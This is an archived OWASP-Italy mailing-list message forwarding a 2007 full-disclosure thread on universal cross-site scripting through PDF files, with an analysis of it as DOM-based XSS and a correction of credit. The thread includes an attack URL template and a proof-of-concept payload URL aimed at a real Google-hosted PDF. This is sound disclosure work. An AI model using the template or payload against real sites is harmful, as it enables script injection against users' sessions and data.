<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<HTML>
 <HEAD>
   <TITLE> [Owasp-italy] [WEB SECURITY] Universal XSS with PDF files:	highly dangerous
   </TITLE>
   <LINK REL="Index" HREF="index.html" >
   <LINK REL="made" HREF="mailto:owasp-italy%40lists.owasp.org?Subject=%5BOwasp-italy%5D%20%5BWEB%20SECURITY%5D%20Universal%20XSS%20with%20PDF%20files%3A%0A%09highly%20dangerous&In-Reply-To=d2d9d92d0701030936l5fed77b1r73a05a3a90f8c032%40mail.gmail.com">
   <META NAME="robots" CONTENT="index,nofollow">
   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
   <LINK REL="Previous"  HREF="000223.html">
   <LINK REL="Next"  HREF="000225.html">
 </HEAD>
 <BODY BGCOLOR="#ffffff">
   <H1>[Owasp-italy] [WEB SECURITY] Universal XSS with PDF files:	highly dangerous</H1>
    <B>Matteo Meucci</B> 
    <A HREF="mailto:owasp-italy%40lists.owasp.org?Subject=%5BOwasp-italy%5D%20%5BWEB%20SECURITY%5D%20Universal%20XSS%20with%20PDF%20files%3A%0A%09highly%20dangerous&In-Reply-To=d2d9d92d0701030936l5fed77b1r73a05a3a90f8c032%40mail.gmail.com"
       TITLE="[Owasp-italy] [WEB SECURITY] Universal XSS with PDF files:	highly dangerous">matteo.meucci at gmail.com
       </A><BR>
    <I>Wed Jan  3 12:39:54 EST 2007</I>
    <P><UL>
        <LI>Previous message: <A HREF="000223.html">[Owasp-italy] Fwd: [WEB SECURITY] Universal XSS with PDF files:	highly dangerous
</A></li>
        <LI>Next message: <A HREF="000225.html">[Owasp-italy] Fwd: [Owasp-leaders] Fwd: BETA Release of OWASP	LiveCD ready for testing!!!!!
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#224">[ date ]</a>
              <a href="thread.html#224">[ thread ]</a>
              <a href="subject.html#224">[ subject ]</a>
              <a href="author.html#224">[ author ]</a>
         </LI>
       </UL>
    <HR>  
<!--beginarticle-->
<PRE>Scusate...
manca il dettaglio pi&#249; importante:

	from	 	<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">sven.vetsch at disenchant.ch</A> &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">sven.vetsch at disenchant.ch</A>&gt; 		 hide
details	 9:37 am (9 hours ago)
	to	 	&quot;pdp (architect)&quot; &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">pdp.gnucitizen at googlemail.com</A>&gt;	
	cc	

 	<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">full-disclosure at lists.grok.org.uk</A>,
<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">bugtraq at securityfocus.com</A>,
Web Security &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">websecurity at webappsec.org</A>&gt;	
	date		Jan 3, 2007 9:37 AM	
	subject		Re: [WEB SECURITY] Universal XSS with PDF files: highly dangerous	
	mailed-by		securityfocus.com	
Quoting &quot;pdp (architect)&quot; &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">pdp.gnucitizen at googlemail.com</A>&gt;:

&gt;<i> This finding was originally mentioned by Sven Vetsch, on his blog.
</I>&gt;<i> This is a very good and quite interesting. Good work.
</I>
Sorry about that but that's wrong. All the credits have to go to Stefano Di
Paola and Giorgio Fedon. They presented that stuff at the 23C3 in Berlin. The
only thing that I did was an overview and I found out, that it doesn't matter
how the parameter is called. I &quot;just&quot; forgot to copy paste the credits from my
original document, to the blog entry. I'm very sorry about that and of course I
putted it in my entry now.

Regards,
Disenchant / Sven Vetsch

On 1/3/07, Matteo Meucci &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">matteo.meucci at gmail.com</A>&gt; wrote:
&gt;<i> FYI.
</I>&gt;<i>
</I>&gt;<i> Applausi copiosi alla coppia Di Paola - Fedon che hanno presentato
</I>&gt;<i> &quot;Subverting AJAX&quot; al 23-esimo CCC e sono gi&#224; celebrit&#224;!
</I>&gt;<i>
</I>&gt;<i> Per approfondimenti:
</I>&gt;<i> <A HREF="http://events.ccc.de/congress/2006/Fahrplan/events/1602.en.html">http://events.ccc.de/congress/2006/Fahrplan/events/1602.en.html</A>
</I>&gt;<i>
</I>&gt;<i> Buon anno!
</I>&gt;<i> Mat
</I>&gt;<i>
</I>&gt;<i> ---------- Forwarded message ----------
</I>&gt;<i> From: <A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">sven.vetsch at disenchant.ch</A> &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">sven.vetsch at disenchant.ch</A>&gt;
</I>&gt;<i> Date: Jan 3, 2007 9:37 AM
</I>&gt;<i> Subject: Re: [WEB SECURITY] Universal XSS with PDF files: highly dangerous
</I>&gt;<i> To: &quot;pdp (architect)&quot; &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">pdp.gnucitizen at googlemail.com</A>&gt;
</I>&gt;<i> Cc: <A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">full-disclosure at lists.grok.org.uk</A>, <A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">bugtraq at securityfocus.com</A>, Web
</I>&gt;<i> Security &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">websecurity at webappsec.org</A>&gt;
</I>&gt;<i>
</I>&gt;<i>
</I>&gt;<i> Quoting &quot;pdp (architect)&quot; &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">pdp.gnucitizen at googlemail.com</A>&gt;:
</I>&gt;<i>
</I>&gt;<i> &gt; This finding was originally mentioned by Sven Vetsch, on his blog.
</I>&gt;<i> &gt; This is a very good and quite interesting. Good work.
</I>&gt;<i>
</I>&gt;<i> Sorry about that but that's wrong. All the credits have to go to Stefano Di
</I>&gt;<i> Paola and Giorgio Fedon. They presented that stuff at the 23C3 in Berlin. The
</I>&gt;<i> only thing that I did was an overview and I found out, that it doesn't matter
</I>&gt;<i> how the parameter is called. I &quot;just&quot; forgot to copy paste the credits from my
</I>&gt;<i> original document, to the blog entry. I'm very sorry about that and of course I
</I>&gt;<i> putted it in my entry now.
</I>&gt;<i>
</I>&gt;<i> Regards,
</I>&gt;<i> Disenchant / Sven Vetsch
</I>&gt;<i>
</I>&gt;<i> ---------- Forwarded message ----------
</I>&gt;<i> Amit Klein &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">aksecurity at gmail.com</A>&gt;
</I>&gt;<i>
</I>&gt;<i> pdp (architect) wrote:
</I>&gt;<i> &gt; I will be very quick and just point to links where you can read about
</I>&gt;<i> &gt; this issue.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; It seams that PDF documents can execute JavaScript code for no
</I>&gt;<i> &gt; apparent reason by using the following template:
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; <A HREF="http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_here">http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_here</A>
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; You must understand that the attacker doesn't need to have write
</I>&gt;<i> &gt; access to the specified PDF document. In order to get an XSS vector
</I>&gt;<i> &gt; working you need to have a PDF file hosted on the target and that's
</I>&gt;<i> &gt; all about it. The rest is just a matter of your abilities and desires.
</I>&gt;<i> &gt;
</I>&gt;<i> Amazing, and kudos to Sven Vetsch who found this.
</I>&gt;<i>
</I>&gt;<i> Note that from attack categorization perspective, it appears to be a
</I>&gt;<i> twisted example of DOM based XSS
</I>&gt;<i> (<A HREF="http://www.webappsec.org/projects/articles/071105.shtml">http://www.webappsec.org/projects/articles/071105.shtml</A>). I suppose PDF
</I>&gt;<i> retrieves the URL from the browser (probably from a degenerate DOM the
</I>&gt;<i> browser provides it - after all, the document object is available to the
</I>&gt;<i> payload JS code!), parses it and uses the fragment. Since fragments are
</I>&gt;<i> used, the payload doesn't travel to the target web server (!). I
</I>&gt;<i> mentioned the possible use of fragments as a particularly nasty attack
</I>&gt;<i> vector (impossible to detect on server) in the &quot;DOM based XSS&quot; writeup.
</I>&gt;<i>
</I>&gt;<i> -Amit
</I>&gt;<i>
</I>&gt;<i> ---------- Forwarded message ----------
</I>&gt;<i> pdp (architect) &lt;<A HREF="http://lists.owasp.org/mailman/listinfo/owasp-italy">pdp.gnucitizen at googlemail.com</A>&gt;
</I>&gt;<i>
</I>&gt;<i> I will be very quick and just point to links where you can read about
</I>&gt;<i> this issue.
</I>&gt;<i>
</I>&gt;<i> It seams that PDF documents can execute JavaScript code for no
</I>&gt;<i> apparent reason by using the following template:
</I>&gt;<i>
</I>&gt;<i>    <A HREF="http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_here">http://path/to/pdf/file.pdf#whatever_name_you_want=javascript:your_code_here</A>
</I>&gt;<i>
</I>&gt;<i> You must understand that the attacker doesn't need to have write
</I>&gt;<i> access to the specified PDF document. In order to get an XSS vector
</I>&gt;<i> working you need to have a PDF file hosted on the target and that's
</I>&gt;<i> all about it. The rest is just a matter of your abilities and desires.
</I>&gt;<i>
</I>&gt;<i> This finding was originally mentioned by Sven Vetsch, on his blog.
</I>&gt;<i> This is a very good and quite interesting. Good work.
</I>&gt;<i>
</I>&gt;<i> There is a POC I composed:
</I>&gt;<i>
</I>&gt;<i> <A HREF="http://www.google.com/librariancenter/downloads/Tips_Tricks_85x11.pdf#something=javascript:function%20createXMLHttpRequest(">http://www.google.com/librariancenter/downloads/Tips_Tricks_85x11.pdf#something=javascript:function%20createXMLHttpRequest(</A>){%20%20%20try{%20return%20new%20ActiveXObject('Msxml2.XMLHTTP');%20}catch(e){}%20%20%20try{%20return%20new%20ActiveXObject('Microsoft.XMLHTTP');%20}catch(e){}%20%20%20try{%20return%20new%20XMLHttpRequest();%20}catch(e){}%20%20%20return%20null;}var%20xhr%20=%20createXMLHttpRequest();xhr.onreadystatechange%20=%20function(){%20%20%20%20if%20(xhr.readyState%20==%204)%20%20%20%20%20%20%20%20alert(xhr.responseText);};xhr.open('GET',%20'<A HREF="http://www.google.com',%20true">http://www.google.com',%20true</A>);xhr.send(null);
</I>&gt;<i>
</I>&gt;<i> More on the matter can be found here:
</I>&gt;<i>
</I>&gt;<i> <A HREF="http://www.gnucitizen.org/blog/danger-danger-danger/">http://www.gnucitizen.org/blog/danger-danger-danger/</A>
</I>&gt;<i> <A HREF="http://www.disenchant.ch/blog/hacking-with-browser-plugins/34">http://www.disenchant.ch/blog/hacking-with-browser-plugins/34</A>
</I>&gt;<i>
</I>&gt;<i> --
</I>&gt;<i> pdp (architect) | petko d. petkov
</I>&gt;<i> <A HREF="http://www.gnucitizen.org">http://www.gnucitizen.org</A>
</I>&gt;<i>
</I>

-- 
Matteo Meucci
OWASP-Italy Chair, CISSP, CISA
<A HREF="http://www.owasp.org/index.php/Italy">http://www.owasp.org/index.php/Italy</A>
OWASP Testing Guide AoC lead
<A HREF="http://www.owasp.org/index.php/OWASP_Autumn_of_Code_2006_-_Projects:_Testing_Guide">http://www.owasp.org/index.php/OWASP_Autumn_of_Code_2006_-_Projects:_Testing_Guide</A>
</PRE>


<!--endarticle-->
    <HR>
    <P><UL>
        <!--threads-->
	<LI>Previous message: <A HREF="000223.html">[Owasp-italy] Fwd: [WEB SECURITY] Universal XSS with PDF files:	highly dangerous
</A></li>
	<LI>Next message: <A HREF="000225.html">[Owasp-italy] Fwd: [Owasp-leaders] Fwd: BETA Release of OWASP	LiveCD ready for testing!!!!!
</A></li>
         <LI> <B>Messages sorted by:</B> 
              <a href="date.html#224">[ date ]</a>
              <a href="thread.html#224">[ thread ]</a>
              <a href="subject.html#224">[ subject ]</a>
              <a href="author.html#224">[ author ]</a>
         </LI>
       </UL>

<hr>
<a href="http://lists.owasp.org/mailman/listinfo/owasp-italy">More information about the Owasp-italy
mailing list</a><br>
</body></html>
